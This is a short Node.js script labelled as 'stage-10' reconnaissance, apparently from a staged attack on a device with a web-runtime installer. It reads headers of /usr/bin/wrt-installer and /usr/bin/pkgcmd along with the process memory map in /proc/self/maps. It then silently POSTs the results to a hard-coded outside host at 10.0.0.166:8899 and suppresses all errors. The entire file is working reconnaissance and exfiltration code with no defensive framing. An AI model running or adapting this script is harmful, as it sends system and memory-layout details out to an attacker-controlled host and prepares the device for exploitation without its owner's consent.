// Stage-10 read-only: installer file types + self-maps readability.
var fs = require('fs');
var http = require('http');
function post(o) {
  var b = JSON.stringify(o);
  var req = http.request({ host: '10.0.0.166', port: 8899, path: '/recon10', method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(b) } }, function (r) { });
  req.on('error', function (e) { });
  req.write(b); req.end();
}
var out = {};
function head(p) {
  try {
    var b = fs.readFileSync(p);
    var isElf = b[0] === 0x7f && b[1] === 0x45;
    return { elf: isElf, size: b.length, head: b.slice(0, 120).toString('latin1') };
  } catch (e) { return 'ERR ' + e.message; }
}
out.wrt_installer = head('/usr/bin/wrt-installer');
out.pkgcmd = head('/usr/bin/pkgcmd');
try { out.maps = fs.readFileSync('/proc/self/maps', 'utf8').split('\n').slice(0, 6); } catch (e) { out.maps = 'ERR ' + e.message; }
post(out);
